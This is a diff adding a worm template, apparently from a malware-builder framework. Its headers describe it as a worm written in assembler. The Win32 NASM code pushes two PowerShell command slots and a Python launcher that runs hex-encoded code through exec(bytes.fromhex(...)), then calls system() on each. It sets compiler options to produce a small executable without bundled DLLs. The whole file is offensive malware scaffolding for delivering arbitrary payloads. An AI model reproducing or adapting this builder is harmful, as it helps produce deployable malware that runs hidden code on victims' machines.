@@ -1,0 +1,43 @@
+#!name##Centipede
+#!types##worm
+#!info##A worm written in assembler. Runs two payloads in PowerShell and one payload in python.
+#!lang##asm
+#!banned##module##starter##shadow##junk
+#!system_FLAG##[W]
+#!globalVar##COMPILER_NAME##MC_win32##Compiler name
+#!globalVar##OS_EXEC##win##Target system executable
+#!processWorm##BasicAsm
+#!reqPayload##CEN_ps1##Powershell command to execute##STACK_BUILD:True##STACK_COMMAND:powershell.exe -Command "$"
+#!reqPayload##CEN_ps2##Powershell command to execute##STACK_BUILD:True##STACK_COMMAND:powershell.exe -Command "$"
+#!reqPayload##CEN_py1##Python Script to execute##STACK_BUILD:True##STACK_COMMAND:cmd.exe /C python -c exec(bytes.fromhex('$')) & pause
+#!payloadOpt##CEN_py1##ENCODE##bytes_hex
+#!payloadOpt##CEN_py1##INCLUDE_IMPORTS##True##Include import library in code
+#!reqVar##GLOBAL_COMPILER_NO_DLL##Whether the compiler should include libraries in the executable. Without the included DLLs, the resulting file takes up very little space.##str
+#!setVar##GLOBAL_COMPILER_NO_DLL##True##str
+
+extern _ExitProcess@4
+extern _system
+
+section .text
+global _main
+    _main:
+    push dword 0x00000000
+    {{CEN_ps1}}
+    push esp
+    call _system
+
+    push dword 0x00000000
+    {{CEN_ps2}}
+    push esp
+    call _system
+
+    push dword 0x00000000
+    {{CEN_py1}}
+    push esp
+    call _system
+
+    push 0
+    call _ExitProcess@4
+
+
+
